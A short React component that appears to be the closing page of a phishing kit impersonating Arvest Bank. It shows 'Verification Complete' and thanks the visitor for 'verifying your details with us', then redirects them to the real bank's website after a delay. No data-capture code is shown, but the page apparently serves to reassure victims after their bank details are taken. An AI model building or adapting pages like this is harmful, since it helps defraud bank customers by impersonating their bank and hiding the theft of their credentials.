import { useEffect } from 'react'
import { Link } from 'react-router-dom'
import { wait } from '../utils/waiter'

export default function Success() {
  const Redirect = () =>{
    wait(4000);
    window.location.replace("https://www.arvest.com")
  }
  useEffect(()=>{
    Redirect();
  }, [])
  return (
    <div>
        <div style={{textAlign:"center"}}>
        <p className="b-3">Verification Complete</p>
          <p style={{ color: "green" }}>
          Thank you for verifying your details with us, You'll be redirected
            to the home page.
          </p>
          <Link to={"https://www.arvest.com"}>Go home</Link>
        </div>
    </div>
  )
}
